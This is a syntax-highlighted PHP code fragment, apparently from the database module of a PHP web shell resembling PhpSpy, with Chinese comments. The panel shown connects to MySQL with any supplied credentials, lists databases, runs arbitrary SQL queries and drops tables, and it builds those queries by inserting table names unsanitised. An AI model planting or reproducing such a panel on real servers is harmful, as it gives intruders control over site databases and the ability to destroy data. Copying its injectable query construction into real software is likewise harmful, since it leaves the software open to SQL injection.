<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mysqllink</span> = mydbconn(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbhost</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbuser</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbpass</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbname</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">charset</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbport</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (q(<span style="color: #8abeb7;">"DROP TABLE </span><span style="color: #f0c674;">$tablename</span><span style="color: #8abeb7;">"</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   m(<span style="color: #8abeb7;">'Drop table of success'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tablename</span> = <span style="color: #8abeb7;">''</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   m(mysql_error());
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   formhead(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'MYSQL Manager'</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'action'</span>,<span style="color: #8abeb7;">'mysqladmin'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;p&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'DBHost:'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makeinput(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'dbhost'</span>,<span style="color: #8abeb7;">'size'</span>=&gt;20,<span style="color: #8abeb7;">'value'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbhost</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">':'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makeinput(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'dbport'</span>,<span style="color: #8abeb7;">'size'</span>=&gt;4,<span style="color: #8abeb7;">'value'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbport</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'DBUser:'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makeinput(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'dbuser'</span>,<span style="color: #8abeb7;">'size'</span>=&gt;15,<span style="color: #8abeb7;">'value'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbuser</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'DBPass:'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makeinput(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'dbpass'</span>,<span style="color: #8abeb7;">'size'</span>=&gt;15,<span style="color: #8abeb7;">'value'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbpass</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'DBCharset:'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makeselect(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'charset'</span>,<span style="color: #8abeb7;">'option'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">charsetdb</span>,<span style="color: #8abeb7;">'selected'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">charset</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'nokey'</span><span style="text-decoration: underline;">=&gt;1));</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makeinput(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'connect'</span>,<span style="color: #8abeb7;">'value'</span>=&gt;<span style="color: #8abeb7;">'Connect'</span>,<span style="color: #8abeb7;">'type'</span>=&gt;<span style="color: #8abeb7;">'submit'</span>,<span style="color: #8abeb7;">'class</span><span style="color: #8abeb7; text-decoration: underline;">'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #8abeb7; text-decoration: underline;">'bt'</span><span style="text-decoration: underline;">));</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;/p&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   formfoot();

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#25805;&#20316;&#35760;&#24405;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   formhead(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'recordlist'</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'doing'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'action'</span>,<span style="color: #8abeb7;">'mysqladmin'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'base64'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'tablename'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbform</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   formfoot();

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#36873;&#23450;&#25968;&#25454;&#24211;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   formhead(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'setdbname'</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'action'</span>,<span style="color: #8abeb7;">'mysqladmin'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbform</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbname</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'dbname'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   formfoot();

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#36873;&#23450;&#34920;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   formhead(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'settable'</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'action'</span>,<span style="color: #8abeb7;">'mysqladmin'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbform</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'tablename'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'page'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">page</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'doing'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   formfoot();

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">cachetables</span> = <span style="color: #b5bd68;">array</span>();<span style="color: #de935f; background-color: #373b41;">     </span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pagenum</span> = 30;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">page</span> = intval(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">page</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">page</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">start_limit</span> = (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">page</span> - 1) * <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pagenum</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">start_limit</span> = 0;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">page</span> = 1;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #b5bd68;">isset</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbhost</span>) &amp;&amp; <span style="color: #b5bd68;">isset</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbuser</span>) &amp;&amp; <span style="color: #b5bd68;">isset</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbpass</span>) &amp;&amp; <span style="color: #b5bd68;">isset</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">connect</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mysqllink</span> = mydbconn(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbhost</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbuser</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbpass</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbname</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">charset</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbp</span><span style="color: #f0c674; text-decoration: underline;">ort</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#33719;&#21462;&#25968;&#25454;&#24211;&#20449;&#24687;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mysqlver</span> = mysql_get_server_info();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;p&gt;MySQL '</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mysqlver</span>.<span style="color: #8abeb7;">' running in '</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbhost</span>.<span style="color: #8abeb7;">' as '</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbuser</span>.<span style="color: #8abeb7;">'@'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbhos</span><span style="color: #f0c674; text-decoration: underline;">t</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'&lt;/p&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">highver</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mysqlver</span> &gt; <span style="color: #8abeb7;">'4.1'</span> ? 1 : 0;

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#33719;&#21462;&#25968;&#25454;&#24211;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">query</span> = q(<span style="color: #8abeb7;">"SHOW DATABASES"</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbs</span> = <span style="color: #b5bd68;">array</span>();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbs</span>[] = <span style="color: #8abeb7;">'-- Select a database --'</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">while</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">db</span> = mysql_fetch_array(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">query</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbs</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">db</span>[<span style="color: #8abeb7;">'Database'</span>]] = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">db</span>[<span style="color: #8abeb7;">'Database'</span>];
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   makeselect(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'Please select a database:'</span>,<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'db[]'</span>,<span style="color: #8abeb7;">'op</span><span style="color: #8abeb7; text-decoration: underline;">tion'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">dbs</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'selected'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">dbname</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'onchange'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #8abeb7; text-decoration: underline;">'moddbname(this.options[this.selectedIndex].value)'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;1));</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tabledb</span> = <span style="color: #b5bd68;">array</span>();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbname</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;p&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'Current dababase: &lt;a href="javascript:moddbname(\''</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbname</span>.<span style="color: #8abeb7;">'\');</span><span style="color: #8abeb7; text-decoration: underline;">"&gt;'</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">dbname</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'&lt;/a&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tablename</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">' | Current Table: &lt;a href="javascript:settable(\''</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'\');"&gt;'</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'&lt;/a&gt; [ &lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'\', \'insert\');"&gt;Insert&lt;/a&gt; | &lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'\', \'structure\');"&gt;Structure&lt;/a&gt; | &lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'\', \'drop\');"&gt;Drop&lt;/a&gt; ]'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;/p&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   mysql_select_db(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbname</span>);

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">getnumsql</span> = <span style="color: #8abeb7;">''</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">runquery</span> = 0;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sql_query</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">runquery</span> = 1;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">allowedit</span> = 0;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tablename</span> &amp;&amp; <span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sql_query</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sql_query</span> = <span style="color: #8abeb7;">"SELECT * FROM </span><span style="color: #f0c674;">$tablename</span><span style="color: #8abeb7;">"</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">getnumsql</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sql_query</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sql_query</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sql_query</span>.<span style="color: #8abeb7;">" LIMIT </span><span style="color: #f0c674;">$start_limit</span><span style="color: #8abeb7;">, </span><span style="color: #f0c674;">$pagenum</span><span style="color: #8abeb7;">"</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">allowedit</span> = 1;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;form action="'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">self</span>.<span style="color: #8abeb7;">'" method="POST"&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;p&gt;&lt;table width="200" border="0" cellpadding="0" cellspacing="0"&gt;</span><span style="color: #8abeb7; text-decoration: underline;">&lt;tr&gt;&lt;td colspan="2"&gt;Run SQL query/queries on database '</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">dbname</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">':&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;textarea name="sql_query" class="area" style="width:600px;height:50px;overflow:auto;"&gt;'</span><span style="text-decoration: underline;">.htmlspecialchars(</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">sql_query</span><span style="text-decoration: underline;">,</span><span style="color: #81a2be; text-decoration: underline;">ENT_QUOTES</span><span style="text-decoration: underline;">).</span><span style="color: #8abeb7; text-decoration: underline;">'&lt;/textarea&gt;&lt;/td&gt;&lt;td style="padding:0 5px;"&gt;&lt;input class="bt" style="height:50px;" name="submit" type="submit" value="Query" /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'tablename'</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tablename</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'action'</span>,<span style="color: #8abeb7;">'mysqladmin'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbform</span>);
